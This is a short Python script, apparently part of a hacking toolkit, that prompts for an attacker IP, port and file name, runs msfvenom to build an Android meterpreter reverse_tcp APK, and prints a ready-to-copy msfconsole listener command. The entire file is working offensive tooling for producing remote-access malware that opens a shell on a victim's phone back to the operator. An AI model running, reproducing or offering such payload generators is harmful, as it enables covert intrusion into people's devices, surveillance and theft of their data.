#!/usr/bin/env python3
import os
import subprocess
import time


RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def start_payload_generator():
    os.system("clear")
    print(BLUE + """
  ░█▀█░█▀█░█░█░█░░░█▀█░█▀█░█▀▄░░░█▀▀░█▀▀░█▀█
  ░█▀▀░█▀█░▀▄█░█░░░█░█░█▀█░█░█░░░█░█░█▀▀░█░█
  ░▀░░░▀░▀░░▀░░▀▀▀░▀▀▀░▀░▀░▀▀░░░░▀▀▀░▀▀▀░▀░▀ 2.1.0
    """ + RESET)
    print(CYAN + "    " + "━" * 50 + RESET)
    
    print(YELLOW + "\n    [*] Please provide the configuration for the APK:" + RESET)
    
    
    print(BLUE + "    " + "—" * 45 + RESET)
    lhost = input(RED + "    [" + WHITE + "+" + RED + "]" + GREEN + " IP Address (LHOST) : " + RESET)
    lport = input(RED + "    [" + WHITE + "+" + RED + "]" + GREEN + " Port Number (LPORT): " + RESET)
    name  = input(RED + "    [" + WHITE + "+" + RED + "]" + GREEN + " File Name (APK)    : " + RESET)
    print(BLUE + "    " + "—" * 45 + RESET)
    
    output_path = f"{name}.apk"
    
    print(YELLOW + f"\n    [*] Initializing MSFvenom engine..." + RESET)
    print(YELLOW + f"    [*] Creating: " + WHITE + output_path + RESET)
    
    
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {output_path}"
    
    try:
        
        subprocess.run(command, shell=True, check=True)
        
        print(GREEN + BOLD + f"\n    [✔] Success! Payload saved as: {output_path}" + RESET)
        
        
        print(BLUE + "\n    ┌─[ " + WHITE + "Listener Command (Copy this)" + BLUE + " ]" + RESET)
        print(WHITE + f"    └─> msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'" + RESET)
        
    except Exception as e:
        print(RED + f"\n    [!] Error generating payload: {e}" + RESET)
    
    print(CYAN + "\n    " + "—" * 45 + RESET)
    input(WHITE + "    Press [Enter] to return to Main Menu..." + RESET)
